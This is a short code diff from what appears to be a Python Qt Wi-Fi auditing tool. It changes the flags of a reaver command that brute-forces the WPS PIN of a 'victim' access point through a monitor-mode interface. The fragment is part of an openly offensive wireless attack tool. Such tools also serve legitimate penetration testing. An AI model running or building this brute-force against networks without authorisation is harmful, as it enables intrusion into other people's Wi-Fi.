@@ -123,7 +123,7 @@ class WPS_Attack(QtCore.QThread):
         progress_regex = re.compile("(\d+\.\d+)%",re.IGNORECASE)
         associate_regex = re.compile("associated with",re.IGNORECASE)
 
-        self.bruteforce_sys_proc = subprocess.Popen("reaver -i %s -b %s -c %s -a" %(self.monitor_interface,self.victim_MAC_Addr,channel),
+        self.bruteforce_sys_proc = subprocess.Popen("reaver -i %s -b %s -c %s -a -N -L" %(self.monitor_interface,self.victim_MAC_Addr,channel),
         shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         self.bruteforce_sys_proc.stdin.write('y')                   # Restore previous session if any
         sys_file = self.bruteforce_sys_proc.stdout
